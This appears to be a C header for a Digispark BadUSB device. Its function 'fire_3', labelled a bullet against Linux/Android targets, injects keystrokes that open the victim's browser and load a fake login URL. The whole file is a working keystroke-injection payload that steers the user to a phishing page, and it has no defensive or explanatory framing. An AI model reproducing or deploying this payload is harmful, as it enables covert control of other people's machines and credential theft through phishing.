#ifndef BULLET_3_H
#define BULLET_3_H

#include "DigiKeyboard.h"

void fire_3() {
  // --- BULLET 3: LINUX / ANDROID TARGET ---
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_B, MOD_GUI_LEFT); // Browser
  DigiKeyboard.delay(500);
  DigiKeyboard.print("http://fake-login.com");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

#endif
